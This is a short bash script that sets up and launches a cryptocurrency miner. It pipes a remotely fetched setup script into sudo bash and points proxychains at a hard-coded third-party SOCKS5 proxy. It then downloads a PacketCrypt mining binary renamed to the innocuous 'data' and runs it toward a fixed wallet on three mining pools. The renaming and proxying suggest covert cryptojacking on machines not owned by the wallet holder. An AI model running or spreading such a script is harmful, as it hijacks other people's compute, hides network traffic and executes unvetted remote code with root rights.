#!/bin/bash
apt update && apt install -y sudo
sudo apt update && sudo apt install gcc screen -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
apt install proxychains -y
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O data && 
chmod +x data && 
./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pktpool.io  http://pool.pkteer.com
